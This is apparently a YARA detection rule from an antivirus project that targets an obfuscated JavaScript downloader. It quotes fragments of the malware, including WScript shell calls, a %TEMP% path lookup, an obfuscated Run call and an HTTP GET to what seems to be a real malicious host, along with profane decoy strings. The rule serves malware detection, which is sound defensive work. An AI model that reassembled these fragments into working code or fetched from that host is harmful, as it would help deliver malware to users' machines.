rule sig_20160428_36ff113a6232d98c410ce3cbde197e49 {
  meta:
    description = "datamaliciousorder - file 20160428_36ff113a6232d98c410ce3cbde197e49.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "873cc8d36152bb2da68c17c35c9b18a516bfc783814ee4085bba63f2a8856fa5"

  strings:
    $s1  = "function SgqOcjOaxNeyJtsNydJry() {return JdlKxzAleTqpZnnRfeBcs[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function MypVwuDwvDtyIivQhaAzh(BikEfpKubMjdSpkMqsIeu){JdlKxzAleTqpZnnRfeBcs[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function MypVwuDwvDtyIivQhaAzh(BikEfpKubMjdSpkMqsIeu){JdlKxzAleTqpZnnRfeBcs[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return OspTbaBcrRzrWghAgjNku - EvrCcwPccVwdYclUvnKny;};" fullword ascii
    $s5  = "var JdlKxzAleTqpZnnRfeBcs = function CuiMlzGleWfyPwjHprXgy() {return LdlEejHafHykRacLssFpz[ZznJpnBahKxnZkhQtpHzx](\"WScript\"+\"" ascii
    $s6  = "function WynDlpPnoJbgFooGsrRxs(OspTbaBcrRzrWghAgjNku, EvrCcwPccVwdYclUvnKny){OziBnvAdkXuxAarTiqNtf = OziBnvAdkXuxAarTiqNtf * 1; " ascii
    $s7  = "XkkXeoVqcGfyBszKzbGpy[BkrGlxNxvCpfVhtKjkZgt](\"G\" + \"ET\", \"http://minisupergame.ru/a9osfg\", false);" fullword ascii
    $s8  = "var LdlEejHafHykRacLssFpz = this[\"WScript\"];" fullword ascii
    $s9  = "var JdlKxzAleTqpZnnRfeBcs = function CuiMlzGleWfyPwjHprXgy() {return LdlEejHafHykRacLssFpz[ZznJpnBahKxnZkhQtpHzx](\"WScript\"+\"" ascii
    $s10 = "function SgqOcjOaxNeyJtsNydJry() {return JdlKxzAleTqpZnnRfeBcs[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function MvuNquBwoZrvExsJecQhq(){return OakSnuLwiVhrEpjKjgAxw + \"\";};" fullword ascii
    $s12 = "if (XkkXeoVqcGfyBszKzbGpy[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function WynDlpPnoJbgFooGsrRxs(OspTbaBcrRzrWghAgjNku, EvrCcwPccVwdYclUvnKny){OziBnvAdkXuxAarTiqNtf = OziBnvAdkXuxAarTiqNtf * 1; " ascii
    $s14 = "function RooHgbQyyYbmMvpJbnIvm() {return ((LhhNevPvzAeqXwyOupUmz == true) && (LhhNevPvzAeqXwyOupUmz == XhzKozCknDuiEbkOgqJnf)) ?" ascii
    $s15 = "function RooHgbQyyYbmMvpJbnIvm() {return ((LhhNevPvzAeqXwyOupUmz == true) && (LhhNevPvzAeqXwyOupUmz == XhzKozCknDuiEbkOgqJnf)) ?" ascii
    $s16 = "function XplVijJkbNtpOjrKraTvq()" fullword ascii
    $s17 = "XhzKozCknDuiEbkOgqJnf = true; " fullword ascii
    $s18 = "HncGtbQhbDodVdhBybEni = true;" fullword ascii
    $s19 = "var LhhNevPvzAeqXwyOupUmz = false;" fullword ascii
    $s20 = "function RoqArwAobZlxFmzInlMvo(){return ZznJpnBahKxnZkhQtpHzx;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}